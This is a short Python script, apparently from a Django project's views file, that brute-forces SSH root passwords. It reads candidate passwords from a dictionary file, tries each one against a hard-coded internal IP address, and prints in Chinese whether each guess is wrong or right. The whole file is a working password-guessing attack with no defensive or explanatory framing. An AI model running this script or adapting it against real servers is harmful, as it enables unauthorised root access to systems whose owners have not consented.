from ssh import ssh_connect

# Create your views here.
def dos_ssh_root_password(ip, dictionary, user="root"):
	passwdfile = open(dictionary, 'r')
	for passwd in passwdfile:
		ssh_list = [ip, passwd.strip(), user]
		ssh_result = ssh_connect(ssh_list)
		if ssh_result[0] == 0:
			print('密码: ' + ssh_result[1].strip() + '不正确')
		else:
			print('密码: ' + ssh_result[1].strip() + '正确')
			print(ssh_result[2].strip())

if __name__ == "__main__":
	dos_ssh_root_password('10.203.106.250', './dictionary.txt')
